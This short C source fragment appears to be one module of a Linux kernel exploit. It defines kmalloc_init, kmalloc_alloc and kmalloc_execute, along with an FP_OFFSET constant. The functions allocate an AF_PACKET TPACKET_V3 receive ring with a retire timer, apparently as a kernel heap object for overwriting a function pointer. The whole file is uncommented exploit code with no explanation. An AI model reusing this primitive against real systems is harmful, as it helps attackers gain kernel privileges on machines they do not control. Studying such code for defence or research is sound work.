#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <netinet/if_ether.h>

#define FP_OFFSET 920

int fp_sock;

void kmalloc_init()
{

}

void kmalloc_alloc()
{
	fp_sock = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));

	int optval = TPACKET_V3;
	setsockopt(fp_sock, SOL_PACKET, PACKET_VERSION, &optval, sizeof(optval));
	struct tpacket_req3 tp;
	memset(&tp, 0, sizeof(tp));
	tp.tp_block_size = 1 * getpagesize();
	tp.tp_block_nr = 1;
	tp.tp_frame_size = getpagesize();
	tp.tp_frame_nr = 1;
	tp.tp_retire_blk_tov = 500;
	setsockopt(fp_sock, SOL_PACKET, PACKET_RX_RING, (void *)&tp, sizeof(tp));
}

void kmalloc_execute()
{
	sleep(5);	
}
